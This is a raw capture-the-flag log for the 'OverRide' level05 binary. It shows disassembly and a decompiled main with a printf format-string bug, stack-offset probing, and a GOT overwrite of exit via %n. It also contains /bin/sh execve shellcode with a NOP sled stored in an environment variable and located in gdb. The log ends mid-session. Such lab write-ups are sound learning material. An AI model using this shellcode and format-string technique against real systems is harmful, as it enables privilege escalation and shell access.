level05@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05


level05@OverRide:~$ ./level05 
a
a
level05@OverRide:~$ ./level05 
aa
aa
level05@OverRide:~$ ./level05 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaalevel05@OverRide:~$


(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	push   %edi
   0x08048448 <+4>:	push   %ebx
   0x08048449 <+5>:	and    $0xfffffff0,%esp
   0x0804844c <+8>:	sub    $0x90,%esp
   0x08048452 <+14>:	movl   $0x0,0x8c(%esp)
   0x0804845d <+25>:	mov    0x80497f0,%eax
   0x08048462 <+30>:	mov    %eax,0x8(%esp)
   0x08048466 <+34>:	movl   $0x64,0x4(%esp)
   0x0804846e <+42>:	lea    0x28(%esp),%eax
   0x08048472 <+46>:	mov    %eax,(%esp)
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
   0x0804847a <+54>:	movl   $0x0,0x8c(%esp)
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    0x28(%esp),%eax
   0x0804848b <+71>:	add    0x8c(%esp),%eax
   0x08048492 <+78>:	movzbl (%eax),%eax
   0x08048495 <+81>:	cmp    $0x40,%al
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    0x28(%esp),%eax
   0x0804849d <+89>:	add    0x8c(%esp),%eax
   0x080484a4 <+96>:	movzbl (%eax),%eax
   0x080484a7 <+99>:	cmp    $0x5a,%al
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    0x28(%esp),%eax
   0x080484af <+107>:	add    0x8c(%esp),%eax
   0x080484b6 <+114>:	movzbl (%eax),%eax
   0x080484b9 <+117>:	mov    %eax,%edx
   0x080484bb <+119>:	xor    $0x20,%edx
   0x080484be <+122>:	lea    0x28(%esp),%eax
   0x080484c2 <+126>:	add    0x8c(%esp),%eax
   0x080484c9 <+133>:	mov    %dl,(%eax)
   0x080484cb <+135>:	addl   $0x1,0x8c(%esp)
   0x080484d3 <+143>:	mov    0x8c(%esp),%ebx
   0x080484da <+150>:	lea    0x28(%esp),%eax
   0x080484de <+154>:	movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:	mov    %eax,%edx
   0x080484e8 <+164>:	mov    $0x0,%eax
   0x080484ed <+169>:	mov    0x1c(%esp),%ecx
   0x080484f1 <+173>:	mov    %edx,%edi
   0x080484f3 <+175>:	repnz scas %es:(%edi),%al
   0x080484f5 <+177>:	mov    %ecx,%eax
   0x080484f7 <+179>:	not    %eax
   0x080484f9 <+181>:	sub    $0x1,%eax
   0x080484fc <+184>:	cmp    %eax,%ebx
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    0x28(%esp),%eax
   0x08048504 <+192>:	mov    %eax,(%esp)
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.




void main(void)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  byte bVar4;
  byte local_78 [100];
  uint local_14;
  
  bVar4 = 0;
  local_14 = 0;
  fgets((char *)local_78,100,stdin);
  local_14 = 0;
  do {
    uVar2 = 0xffffffff;
    pbVar3 = local_78;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      bVar1 = *pbVar3;
      pbVar3 = pbVar3 + (uint)bVar4 * -2 + 1;
    } while (bVar1 != 0);
    if (~uVar2 - 1 <= local_14) {
      printf((char *)local_78);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (('@' < (char)local_78[local_14]) && ((char)local_78[local_14] < '[')) {
      local_78[local_14] = local_78[local_14] ^ 0x20;
    }
    local_14 = local_14 + 1;
  } while( true );
}

level05@OverRide:~$ python -c 'print "aaaa" + "%x " * 12' | ./level05 
aaaa64 f7fcfac0 f7ec3add ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 25207825 78252078

10eme pos

(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330


"\x08\x04\x97\xe0"[::-1] ? %10$n

0x80497e0
\xe0\x97\x04\x08

python -c 'print "\x08\x04\x97\xe0"[::-1] + "?" + "%10$n"'

python -c 'print "\xe0\x97\x04\x08" + "?" + "%10$n"'


shellcode :
```
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```
size : 21

level05@OverRide:~$ export PAYLOAD=$'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
level05@OverRide:~$ echo $PAYLOAD 
1���
    Qh//shh/bin��̀












level05@OverRide:~$ env -i  PAYLOAD=$'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' gdb level05
(gdb) r                
Starting program: /home/users/level05/level05 
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) show environment 
PAYLOAD=1���
            Qh//shh/bin��̀
LINES=53
COLUMNS=102
(gdb) x/200s environ   
0xffffde9c:	 "\221\337\377\377\257\337\377\377\273\337\377\377\323\337\377\377"
0xffffdead:	 ""
0xffffdeae:	 ""
0xffffdeaf:	 ""
0xffffdeb0:	 " "
0xffffdeb2:	 ""
0xffffdeb3:	 ""
0xffffdeb4:	 "0\264\375\367!"
0xffffdeba:	 ""
0xffffdebb:	 ""
0xffffdebc:	 ""
0xffffdebd:	 "\260\375\367\020"
0xffffdec2:	 ""
0xffffdec3:	 ""
0xffffdec4:	 "\377\373\213\027\006"
0xffffdeca:	 ""
0xffffdecb:	 ""
0xffffdecc:	 ""
0xffffdecd:	 "\020"
0xffffdecf:	 ""
0xffffded0:	 "\021"
0xffffded2:	 ""
0xffffded3:	 ""
0xffffded4:	 "d"
0xffffded6:	 ""
0xffffded7:	 ""
0xffffded8:	 "\003"
0xffffdeda:	 ""
0xffffdedb:	 ""
0xffffdedc:	 "4\200\004\b\004"
0xffffdee2:	 ""
0xffffdee3:	 ""
0xffffdee4:	 " "
0xffffdee6:	 ""
0xffffdee7:	 ""
0xffffdee8:	 "\005"
0xffffdeea:	 ""
0xffffdeeb:	 ""
0xffffdeec:	 "\b"
0xffffdeee:	 ""
0xffffdeef:	 ""
0xffffdef0:	 "\a"
0xffffdef2:	 ""
0xffffdef3:	 ""
0xffffdef4:	 ""
0xffffdef5:	 "\300\375\367\b"
0xffffdefa:	 ""
0xffffdefb:	 ""
0xffffdefc:	 ""
0xffffdefd:	 ""
0xffffdefe:	 ""
0xffffdeff:	 ""
0xffffdf00:	 "\t"
0xffffdf02:	 ""
0xffffdf03:	 ""
0xffffdf04:	 "\220\203\004\b\v"
0xffffdf0a:	 ""
0xffffdf0b:	 ""
0xffffdf0c:	 "\355\003"
0xffffdf0f:	 ""
0xffffdf10:	 "\f"
0xffffdf12:	 ""
0xffffdf13:	 ""
0xffffdf14:	 "\355\003"
0xffffdf17:	 ""
0xffffdf18:	 "\r"
0xffffdf1a:	 ""
0xffffdf1b:	 ""
0xffffdf1c:	 "\355\003"
0xffffdf1f:	 ""
0xffffdf20:	 "\016"
0xffffdf22:	 ""
0xffffdf23:	 ""
0xffffdf24:	 "\355\003"
0xffffdf27:	 ""
0xffffdf28:	 "\027"
0xffffdf2a:	 ""
0xffffdf2b:	 ""
0xffffdf2c:	 ""
0xffffdf2d:	 ""
0xffffdf2e:	 ""
0xffffdf2f:	 ""
0xffffdf30:	 "\031"
0xffffdf32:	 ""
0xffffdf33:	 ""
0xffffdf34:	 "[\337\377\377\037"
0xffffdf3a:	 ""
0xffffdf3b:	 ""
0xffffdf3c:	 "\334\337\377\377\017"
0xffffdf42:	 ""
0xffffdf43:	 ""
0xffffdf44:	 "k\337\377\377"
0xffffdf49:	 ""
0xffffdf4a:	 ""
0xffffdf4b:	 ""
0xffffdf4c:	 ""
0xffffdf4d:	 ""
0xffffdf4e:	 ""
0xffffdf4f:	 ""
0xffffdf50:	 ""
0xffffdf51:	 ""
0xffffdf52:	 ""
0xffffdf53:	 ""
0xffffdf54:	 ""
0xffffdf55:	 ""
0xffffdf56:	 ""
0xffffdf57:	 ""
0xffffdf58:	 ""
0xffffdf59:	 ""
0xffffdf5a:	 ""
0xffffdf5b:	 "D"
0xffffdf5d:	 "}\303\345\032_\261k\253\031P;*~\230i686"
0xffffdf70:	 ""
0xffffdf71:	 ""
0xffffdf72:	 ""
0xffffdf73:	 ""
0xffffdf74:	 ""
0xffffdf75:	 "/home/users/level05/level05"
0xffffdf91:	 "PAYLOAD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
0xffffdfaf:	 "COLUMNS=102"
0xffffdfbb:	 "PWD=/home/users/level05"
0xffffdfd3:	 "LINES=53"
0xffffdfdc:	 "/home/users/level05/level05"
0xffffdff8:	 ""
0xffffdff9:	 ""
0xffffdffa:	 ""
0xffffdffb:	 ""
0xffffdffc:	 ""
0xffffdffd:	 ""
0xffffdffe:	 ""
0xffffdfff:	 ""
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>

(gdb) x/10s 0xffffdf91
0xffffdf91:	 "PAYLOAD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
0xffffdfaf:	 "COLUMNS=102"
0xffffdfbb:	 "PWD=/home/users/level05"
0xffffdfd3:	 "LINES=53"
0xffffdfdc:	 "/home/users/level05/level05"
0xffffdff8:	 ""
0xffffdff9:	 ""
0xffffdffa:	 ""
0xffffdffb:	 ""
0xffffdffc:	 ""
(gdb) x 0xffffdf91    
0xffffdf91:	 "PAYLOAD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdf92
0xffffdf92:	 "AYLOAD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdf9a
0xffffdf9a:	 "\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdf99
0xffffdf99:	 "1\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) unset environment COLUMNS
(gdb) x/10s 0xffffdf91         
0xffffdf91:	 "PAYLOAD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
0xffffdfaf:	 "COLUMNS=102"
0xffffdfbb:	 "PWD=/home/users/level05"
0xffffdfd3:	 "LINES=53"
0xffffdfdc:	 "/home/users/level05/level05"
0xffffdff8:	 ""
0xffffdff9:	 ""
0xffffdffa:	 ""
0xffffdffb:	 ""
0xffffdffc:	 ""
(gdb) show environment 
PAYLOAD=1���
            Qh//shh/bin��̀
LINES=53
(gdb) r                
The program being debugged has been started already.
Start it from the beginning? (y or n) ^Cy
Starting program: /home/users/level05/level05 
Quit
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level05/level05 
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) show environment 
PAYLOAD=1���
            Qh//shh/bin��̀
LINES=53
(gdb) x/10s 0xffffdf91 
0xffffdf91:	 "l05/level05"
0xffffdf9d:	 "PAYLOAD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
0xffffdfbb:	 "PWD=/home/users/level05"
0xffffdfd3:	 "LINES=53"
0xffffdfdc:	 "/home/users/level05/level05"
0xffffdff8:	 ""
0xffffdff9:	 ""
0xffffdffa:	 ""
0xffffdffb:	 ""
0xffffdffc:	 ""
(gdb) x 0xffffdf9d
0xffffdf9d:	 "PAYLOAD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffe001
0xffffe001:	 <Address 0xffffe001 out of bounds>
(gdb) x 0xffffdf9f
0xffffdf9f:	 "YLOAD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdfa2
0xffffdfa2:	 "AD=1\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdfa5
0xffffdfa5:	 "1\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) 
0xffffdfbb:	 "PWD=/home/users/level05"
(gdb) x 0xffffdfa5
0xffffdfa5:	 "1\311\367\341\260\vQh//shh/bin\211\343\315\200"


0xffffdfa5 -> %4294959013x


python -c 'print "\xe0\x97\x04\x08" + "%4294959013x" + "%10$n"'



level05@OverRide:~$ env -i PAYLOAD=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" ') gdb level05 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/users/level05/level05 
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) show environment 
PAYLOAD=����������������������������������������������������������������������������������������������������1���
          Qh//shh/bin��̀
LINES=53
COLUMNS=102
(gdb) x/100s environ 
0xffffde3c:	 "-\337\377\377\257\337\377\377\273\337\377\377\323\337\377\377"
0xffffde4d:	 ""
0xffffde4e:	 ""
0xffffde4f:	 ""
0xffffde50:	 " "
0xffffde52:	 ""
0xffffde53:	 ""
0xffffde54:	 "0\264\375\367!"
0xffffde5a:	 ""
0xffffde5b:	 ""
0xffffde5c:	 ""
0xffffde5d:	 "\260\375\367\020"
0xffffde62:	 ""
0xffffde63:	 ""
0xffffde64:	 "\377\373\213\027\006"
0xffffde6a:	 ""
0xffffde6b:	 ""
0xffffde6c:	 ""
0xffffde6d:	 "\020"
0xffffde6f:	 ""
0xffffde70:	 "\021"
0xffffde72:	 ""
0xffffde73:	 ""
0xffffde74:	 "d"
0xffffde76:	 ""
0xffffde77:	 ""
0xffffde78:	 "\003"
0xffffde7a:	 ""
0xffffde7b:	 ""
0xffffde7c:	 "4\200\004\b\004"
0xffffde82:	 ""
0xffffde83:	 ""
0xffffde84:	 " "
0xffffde86:	 ""
0xffffde87:	 ""
0xffffde88:	 "\005"
0xffffde8a:	 ""
0xffffde8b:	 ""
0xffffde8c:	 "\b"
0xffffde8e:	 ""
0xffffde8f:	 ""
0xffffde90:	 "\a"
0xffffde92:	 ""
0xffffde93:	 ""
0xffffde94:	 ""
0xffffde95:	 "\300\375\367\b"
0xffffde9a:	 ""
0xffffde9b:	 ""
0xffffde9c:	 ""
0xffffde9d:	 ""
0xffffde9e:	 ""
0xffffde9f:	 ""
---Type <return> to continue, or q <return> to quit---
0xffffdea0:	 "\t"
0xffffdea2:	 ""
0xffffdea3:	 ""
0xffffdea4:	 "\220\203\004\b\v"
0xffffdeaa:	 ""
0xffffdeab:	 ""
0xffffdeac:	 "\355\003"
0xffffdeaf:	 ""
0xffffdeb0:	 "\f"
0xffffdeb2:	 ""
0xffffdeb3:	 ""
0xffffdeb4:	 "\355\003"
0xffffdeb7:	 ""
0xffffdeb8:	 "\r"
0xffffdeba:	 ""
0xffffdebb:	 ""
0xffffdebc:	 "\355\003"
0xffffdebf:	 ""
0xffffdec0:	 "\016"
0xffffdec2:	 ""
0xffffdec3:	 ""
0xffffdec4:	 "\355\003"
0xffffdec7:	 ""
0xffffdec8:	 "\027"
0xffffdeca:	 ""
0xffffdecb:	 ""
0xffffdecc:	 ""
0xffffdecd:	 ""
0xffffdece:	 ""
0xffffdecf:	 ""
0xffffded0:	 "\031"
0xffffded2:	 ""
0xffffded3:	 ""
0xffffded4:	 "\373\336\377\377\037"
0xffffdeda:	 ""
0xffffdedb:	 ""
0xffffdedc:	 "\334\337\377\377\017"
0xffffdee2:	 ""
0xffffdee3:	 ""
0xffffdee4:	 "\v\337\377\377"
0xffffdee9:	 ""
0xffffdeea:	 ""
0xffffdeeb:	 ""
0xffffdeec:	 ""
0xffffdeed:	 ""
0xffffdeee:	 ""
0xffffdeef:	 ""
0xffffdef0:	 ""
(gdb) x/200s environ 
0xffffde3c:	 "-\337\377\377\257\337\377\377\273\337\377\377\323\337\377\377"
0xffffde4d:	 ""
0xffffde4e:	 ""
0xffffde4f:	 ""
0xffffde50:	 " "
0xffffde52:	 ""
0xffffde53:	 ""
0xffffde54:	 "0\264\375\367!"
0xffffde5a:	 ""
0xffffde5b:	 ""
0xffffde5c:	 ""
0xffffde5d:	 "\260\375\367\020"
0xffffde62:	 ""
0xffffde63:	 ""
0xffffde64:	 "\377\373\213\027\006"
0xffffde6a:	 ""
0xffffde6b:	 ""
0xffffde6c:	 ""
0xffffde6d:	 "\020"
0xffffde6f:	 ""
0xffffde70:	 "\021"
0xffffde72:	 ""
0xffffde73:	 ""
0xffffde74:	 "d"
0xffffde76:	 ""
0xffffde77:	 ""
0xffffde78:	 "\003"
0xffffde7a:	 ""
0xffffde7b:	 ""
0xffffde7c:	 "4\200\004\b\004"
0xffffde82:	 ""
0xffffde83:	 ""
0xffffde84:	 " "
0xffffde86:	 ""
0xffffde87:	 ""
0xffffde88:	 "\005"
0xffffde8a:	 ""
0xffffde8b:	 ""
0xffffde8c:	 "\b"
0xffffde8e:	 ""
0xffffde8f:	 ""
0xffffde90:	 "\a"
0xffffde92:	 ""
0xffffde93:	 ""
0xffffde94:	 ""
0xffffde95:	 "\300\375\367\b"
0xffffde9a:	 ""
0xffffde9b:	 ""
0xffffde9c:	 ""
0xffffde9d:	 ""
0xffffde9e:	 ""
0xffffde9f:	 ""
---Type <return> to continue, or q <return> to quit---
0xffffdea0:	 "\t"
0xffffdea2:	 ""
0xffffdea3:	 ""
0xffffdea4:	 "\220\203\004\b\v"
0xffffdeaa:	 ""
0xffffdeab:	 ""
0xffffdeac:	 "\355\003"
0xffffdeaf:	 ""
0xffffdeb0:	 "\f"
0xffffdeb2:	 ""
0xffffdeb3:	 ""
0xffffdeb4:	 "\355\003"
0xffffdeb7:	 ""
0xffffdeb8:	 "\r"
0xffffdeba:	 ""
0xffffdebb:	 ""
0xffffdebc:	 "\355\003"
0xffffdebf:	 ""
0xffffdec0:	 "\016"
0xffffdec2:	 ""
0xffffdec3:	 ""
0xffffdec4:	 "\355\003"
0xffffdec7:	 ""
0xffffdec8:	 "\027"
0xffffdeca:	 ""
0xffffdecb:	 ""
0xffffdecc:	 ""
0xffffdecd:	 ""
0xffffdece:	 ""
0xffffdecf:	 ""
0xffffded0:	 "\031"
0xffffded2:	 ""
0xffffded3:	 ""
0xffffded4:	 "\373\336\377\377\037"
0xffffdeda:	 ""
0xffffdedb:	 ""
0xffffdedc:	 "\334\337\377\377\017"
0xffffdee2:	 ""
0xffffdee3:	 ""
0xffffdee4:	 "\v\337\377\377"
0xffffdee9:	 ""
0xffffdeea:	 ""
0xffffdeeb:	 ""
0xffffdeec:	 ""
0xffffdeed:	 ""
0xffffdeee:	 ""
0xffffdeef:	 ""
0xffffdef0:	 ""
0xffffdef1:	 ""
0xffffdef2:	 ""
0xffffdef3:	 ""
0xffffdef4:	 ""
---Type <return> to continue, or q <return> to quit---
0xffffdef5:	 ""
0xffffdef6:	 ""
0xffffdef7:	 ""
0xffffdef8:	 ""
0xffffdef9:	 ""
0xffffdefa:	 ""
0xffffdefb:	 "\260+\205\216\204\251a\374*\\sn\231\243\002\275i686"
0xffffdf10:	 ""
0xffffdf11:	 "/home/users/level05/level05"
0xffffdf2d:	 "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
0xffffdfaf:	 "COLUMNS=102"
0xffffdfbb:	 "PWD=/home/users/level05"
0xffffdfd3:	 "LINES=53"
0xffffdfdc:	 "/home/users/level05/level05"
0xffffdff8:	 ""
0xffffdff9:	 ""
0xffffdffa:	 ""
0xffffdffb:	 ""
0xffffdffc:	 ""
0xffffdffd:	 ""
0xffffdffe:	 ""
0xffffdfff:	 ""
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>
0xffffe000:	 <Address 0xffffe000 out of bounds>

(gdb) x 0xffffdf2d
